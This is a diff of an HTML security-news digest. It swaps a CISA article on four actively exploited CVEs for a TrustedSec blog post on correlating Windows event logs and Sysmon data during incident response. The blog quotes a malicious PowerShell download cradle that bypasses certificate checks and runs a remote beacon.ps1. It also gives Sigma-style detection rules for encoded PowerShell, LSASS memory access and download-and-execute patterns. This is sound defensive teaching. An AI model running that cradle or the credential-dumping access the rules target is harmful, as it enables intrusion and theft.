-            <div class="content-text">The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Friday [added](https://www.cisa.gov/news-events/alerts/2026/04/24/cisa-adds-four-known-exploited-vulnerabilities-catalog) four vulnerabilities impacting SimpleHelp, Samsung MagicINFO 9 Server, and D-Link DIR-823X series routers to its Known Exploited Vulnerabilities ([KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)) catalog, citing evidence of active exploitation.
-The list of vulnerabilities is below -
-[CVE-2024-57726](https://www.cve.org/CVERecord?id=CVE-2024-57726)(CVSS score: 9.9) - A missing authorization vulnerability in SimpleHelp that could allow low-privileged technicians to create API keys with excessive permissions, which can then be used to escalate privileges to the server admin role.[CVE-2024-57728](https://www.cve.org/CVERecord?id=CVE-2024-57728)(CVSS score: 7.2) - A path traversal vulnerability in SimpleHelp that allows admin users to upload arbitrary files anywhere on the file system by uploading a crafted zip file (i.e., zip slip), which can be exploited to execute arbitrary code on the host in the context of the SimpleHelp server user.[CVE-2024-7399](https://www.cve.org/CVERecord?id=CVE-2024-7399)(CVSS score: 8.8) - A path traversal vulnerability in Samsung MagicINFO 9 Server that could allow an attacker to write arbitrary files as system authority.[CVE-2025-29635](https://www.cve.org/CVERecord?id=CVE-2025-29635)(CVSS score: 7.5) - A command injection vulnerability in end-of-life D-Link DIR-823X series routers that allows an authorized attacker to execute arbitrary commands on remote devices by sending a POST request to /goform/set_prohibiting via the corresponding function.
-While both the SimpleHelp flaws have been marked as "Unknown" against the "Known To Be Used in Ransomware Campaigns?" indicator in the KEV catalog, reports from [Field Effect](https://thehackernews.com/2025/02/hackers-exploit-simplehelp-rmm-flaws.html) and [Sophos](https://thehackernews.com/2025/05/dragonforce-exploits-simplehelp-flaws.html) revealed early last year that the issues were exploited as a precursor to ransomware attacks. One such campaign was attributed to the DragonForce ransomware operation.
-The exploitation of CVE-2024-7399 has been [linked](https://thehackernews.com/2025/05/hackers-exploit-samsung-magicinfo.html) to malicious activity deploying the Mirai botnet in the past. As for CVE-2025-29635, Akamai [disclosed](https://thehackernews.com/2026/04/mirai-variant-nexcorium-exploits-cve.html) earlier this week that it recorded attempts against D-Link devices to deliver a Mirai botnet variant named "tuxnokill."
-To mitigate the active threats, Federal Civilian Executive Branch (FCEB) agencies are recommended to apply the fixes or, in the case of CVE-2025-29635, discontinue the use of the appliance by May 8, 2026.
-[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-7" class="article-body">
             <h2 class="article-title">Patch Tuesday, April 2026 Edition</h2>
             <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/04/patch-tuesday-april-2026-edition/" target="_blank">Original Link</a></p>
             <div class="content-text">Microsoft today pushed software updates to fix a staggering 167 security vulnerabilities in its Windows operating systems and related software, including a SharePoint Server zero-day and a publicly disclosed weakness in Windows Defender dubbed “BlueHammer.” Separately, Google Chrome fixed its fourth zero-day of 2026, and an emergency update for Adobe Reader nixes an actively exploited flaw that can lead to remote code execution.
@@ -398,6 +307,240 @@ The reminder to fully restart browsers is especially useful, since many users de
 There is also a smart crossover with PC-focused audiences interested in smooth and secure entertainment setups. Users searching for magis tv for pc often want optimized Windows performance, updated browsers, and safer software environments. Connecting security maintenance with PC streaming guides creates relevant long-tail traffic opportunities while serving readers with practical value.
 well this 1 broke windows explorer from running on reboot. on my win 11 25h2 pc, beware.
 Great article! The flow of the article really helps the message land. Keep them coming!</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-7" class="article-body">
+            <h2 class="article-title">Building a Detection Foundation: Part 5 - Correlation in Practice</h2>
+            <p class="source-link">Source: TrustedSec | <a href="https://trustedsec.com/blog/building-a-detection-foundation-part-5-correlation-in-practice" target="_blank">Original Link</a></p>
+            <div class="content-text">Building a Detection Foundation: Part 5 - Correlation in Practice
+Table of contents
+From Data Sources to Detection
+We've covered a lot of ground in this series: Windows Security events for logon tracking and process execution; PowerShell logging for script visibility; Sysmon for network connections; registry changes; and everything native logging misses.
+But having logs isn't the same as using them effectively. In this final part, I want to walk through how these data sources work together—in detection engineering and Incident Response.
+As can be gleaned from the previous posts in this series, to get the most out of the logs, a SIEM solution where logs are shipped to is a must. Local logs have proven invaluable, but they are at the mercy of the attacker.
+The Correlation Model
+At the heart of Windows forensics and detection is a simple concept: every action happens in a context. That context is defined by:
+- Who: The user account and session
+- What: The process, command, or action
+- When: The timestamp
+- Where: The system, and potentially the source system for remote activity
+- How: The parent process, the logon type, the network path
+Our logging foundation captures each of these elements across multiple event sources. The art is correlating them.
+The LogonID Thread
+I've mentioned LogonID repeatedly throughout this series because it's the key correlation point in Windows. Let me show you how it ties everything together.
+When a user logs on (Event 4624), they receive a LogonID. That same LogonID appears in:
+- Event 4688 / Sysmon Event 1: Process creation by that session
+- Events 4656, 4663: Object access by that session
+- Event 4672: Special privileges for that session
+- PowerShell 4103, 4104: Script execution by that session
+- Sysmon Event 3: Network connections by processes in that session
+This means you can take any suspicious event and trace it back to:
+- The session it belongs to
+- All other activity within that session
+- The authentication event that created the session
+A Real Investigation Flow
+Let me walk through a realistic scenario that demonstrates this correlation.
+Initial Alert: Your SIEM detects a suspicious PowerShell script block (Event 4104):
+Event ID: 4104
+TimeCreated: 2024-03-15 14:23:45
+ScriptBlockText:
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+$wc = New-Object System.Net.WebClient
+$wc.DownloadString("https://192.168.100.50/beacon.ps1") | IEX
+This is a download cradle with certificate validation bypass. Clearly malicious. Now what?
+Step 1: Identify the session
+Look at the same event's metadata to get the user context and Security ID.
+Step 2: Find the process context (Sysmon Event 1)
+Query for powershell.exe process creation around the same time:
+Now you know:
+- PowerShell was spawned by cmd. exe
+- Execution policy was bypassed
+- Window was hidden
+- User was CORP\jsmith
+- LogonID is 0x7A8B4
+Step 3: Trace the parent chain
+What spawned cmd. exe? Query Sysmon Event 1 for that process ID:
+Outlook spawned the command prompt. This is likely a phishing email with a malicious attachment or link.
+Step 4: Check network connections (Sysmon Event 3)
+Did PowerShell actually connect to that IP address?
+Event ID: 3 (Sysmon)
+TimeCreated: 2024-03-15 14:23:46
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+DestinationIp: 192.168.100.50
+DestinationPort: 443
+Protocol: tcp
+User: CORP\jsmith
+Confirmed. PowerShell connected to the C2 server.
+Step 5: Look for follow-up activity
+Using the LogonID, search for all subsequent events in that session:
+- Additional process creation (Event 4688, Sysmon 1)
+- File creation (Sysmon Event 11)
+- Registry modifications (Sysmon Events 12, 13)
+- More network connections (Sysmon Event 3)
+- LSASS access (Sysmon Event 10)
+Step 6: Identify the initial AP (Event 4624)
+Event ID: 4624
+TimeCreated: 2024-03-15 08:15:22
+TargetUserName: jsmith
+LogonType: 2
+WorkstationName: WORKSTATION01
+LogonId: 0x7A8B4
+The user logged on interactively at 8:15AM. The malicious activity started at 2:23PM. The attacker likely had to wait for the user to interact with the phishing email.
+Step 7: Scope the damage
+With the session bounded by logon (4624) and logoff (4634), you can identify everything that happened:
+- Files created or modified
+- Registry changes
+- Lateral movement attempts
+- Data staged for exfiltration
+Building Detections That Use Correlation
+Detection engineering benefits from correlation too. Instead of alerting on individual events, you can build detections that require multiple corroborating signals.
+Example 1: LSASS Access From Suspicious Parent
+Logic: Alert when a process accesses LSASS (Sysmon Event 10) AND the parent process is unusual
+# Pseudocode detection logic
+correlation:
+- sysmon_event_10:
+TargetImage: "lsass.exe"
+GrantedAccess:
+- "0x1010"
+- "0x1FFFFF"
+- sysmon_event_1:
+ProcessId: $source_process_id
+ParentImage: not in [
+"MsMpEng.exe",
+"csrss.exe",
+"services.exe"
+]
+Example 2: Download and Execute Pattern
+Logic: Alert when you see a network connection (Sysmon Event 3) followed by a new process creation (Sysmon Event 1) from a script interpreter within a short time window
+# Pseudocode
+correlation:
+- sysmon_event_3:
+Image: contains ["powershell", "wscript", "cscript", "mshta"]
+DestinationIsIpv6: false
+- within 30 seconds:
+- sysmon_event_1:
+ParentImage: same as above
+Image: not in [legitimate_children]
+Example 3: Persistence Followed by Execution
+Logic: Alert when a registry run key is created (Sysmon Event 13) and then a process starts from that path
+# Pseudocode
+correlation:
+- sysmon_event_13:
+TargetObject: contains "CurrentVersion\Run"
+Details: capture as $executable_path
+- within 1 hour:
+- sysmon_event_1:
+Image: equals $executable_path
+Practical Detection Examples
+Let me provide some concrete Sigma-style detection rules that leverage our logging foundation. I like [Sigma](https://github.com/SigmaHQ/sigma) rules because they can be used with most SIEMs.
+Encoded PowerShell Execution
+title: Encoded PowerShell Command Execution
+status: stable
+logsource:
+product: windows
+category: process_creation
+detection:
+selection_process:
+Image|endswith: '\powershell.exe'
+selection_encoded:
+CommandLine|contains:
+- ' -enc '
+- ' -encodedcommand '
+- ' -ec '
+condition: selection_process and selection_encoded
+level: medium
+LSASS Memory Access
+title: LSASS Memory Access by Suspicious Process
+status: stable
+logsource:
+product: windows
+category: sysmon
+service: sysmon
+detection:
+selection:
+EventID: 10
+TargetImage|endswith: '\lsass.exe'
+GrantedAccess:
+- '0x1010'
+- '0x1410'
+- '0x1FFFFF'
+filter_legitimate:
+SourceImage|contains:
+- '\MsMpEng.exe'
+- '\vmtoolsd.exe'
+- '\csrss.exe'
+condition: selection and not filter_legitimate
+level: high
+Remote PowerShell Execution (WinRM)
+New Service Installation
+title: Suspicious Service Installation
+status: stable
+logsource:
+product: windows
+service: security
+detection:
+selection:
+EventID: 4697
+filter_legitimate:
+ServiceFileName|contains:
+- '\Windows\'
+- '\Program Files\'
+condition: selection and not filter_legitimate
+level: high
+Building a Correlation Playbook
+When responding to incidents, having a systematic approach helps. Here's a playbook structure:
+For Any Suspicious Process:
+1. Get process details (Sysmon Event 1)
+- Image, CommandLine, Hashes
+- Parent process chain
+2. Check network activity (Sysmon Event 3)
+- Did this process make external connections?
+3. Check file operations (Sysmon Event 11)
+- Did this process create files?
+4. Check registry operations (Sysmon Events 12, 13, 14)
+- Did this process establish persistence?
+5. Identify the session (LogonID → Event 4624)
+- Who was logged on?
+- From where?
+6. Scope all session activity
+- What else happened in this session?
+For Lateral Movement Investigation:
+1. Identify network logons (Event 4624, LogonTypes 3, 10)
+- From which source IP addresses?
+- Which accounts?
+2. Trace the source
+- Look for the same account on the source system
+- What initiated the connection?
+3. Check for credential material
+- LSASS access on source (Sysmon Event 10)
+- Kerberos ticket requests (Events 4768, 4769)
+The Value of Redundancy
+Throughout this series, I've emphasized layered telemetry, sometimes a bit too much? Let me give you one final example of why this all matters.
+Scenario: An attacker uses a signed, living-off-the-land (LOTL) binary to execute malicious code.
+What EDR might show: Possibly nothing—the binary is signed and commonly used.
+What you'll see with our foundation:
+Event Source | What It Captures |
+|---|---|
+Event 4624 | Initial logon session |
+Event 4688 | mshta.exe execution with URL parameter |
+Sysmon Event 1 | Same, plus hash, parent process |
+Sysmon Event 3 | Network connection to malicious URL |
+PowerShell 4104 | If PowerShell was spawned, full script content |
+Sysmon Event 11 | Any payloads written to disk |
+Sysmon Event 13 | Persistence mechanisms created |
+Even if your EDR is blind, you have the full story.
+Final Thoughts
+Building a detection foundation isn't a one-time project. It's a capability that requires ongoing attention:
+- Tune your configurations as you learn what's noisy and what's valuable.
+- Test your visibility by running adversary simulations.
+- Practice correlation before you need it in a real incident.
+- Document your environment so you know what's logging and what isn't.
+The ultimate goal we've worked toward in this series is resilience. When (not if) your primary security tool misses something, you want to have the data to detect and investigate independently.
+The techniques we've covered—native Windows auditing, PowerShell logging, and Sysmon—are proven, operationally tested, and free. They require effort to implement well, but that effort pays dividends every time you use them to answer the question: "What exactly happened here?"
+If you need help with this effort, [get in touch with us](https://trustedsec.com/contact)! We have a great Purple Team that can assist in planning and building your detection foundation.
+I may tackle the same approach for Linux ... 🤔</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
